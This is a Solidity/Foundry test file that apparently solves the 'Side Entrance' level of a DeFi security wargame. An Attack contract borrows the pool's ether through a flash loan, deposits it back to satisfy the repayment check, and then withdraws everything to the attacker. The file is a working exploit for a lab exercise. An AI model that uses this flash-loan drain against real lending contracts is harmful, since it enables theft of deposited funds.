// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Attack is IFlashLoanEtherReceiver {
    address pool;
    uint256 amount;
    address owner;

    constructor(address _owner, address _pool, uint256 _amount) {
        pool = _pool;
        amount = _amount;
        owner = _owner;
    }

    function start() external {
        SideEntranceLenderPool(pool).flashLoan(amount);
    }

    function execute() external payable {
        SideEntranceLenderPool(pool).deposit{value: amount}();
    }

    function redeem() external {
        SideEntranceLenderPool(pool).withdraw();
        owner.call{value: amount}("");
    }

    receive() external payable {}
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        Attack cAttack = new Attack(attacker, address(sideEntranceLenderPool), ETHER_IN_POOL);
        cAttack.start();
        cAttack.redeem();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
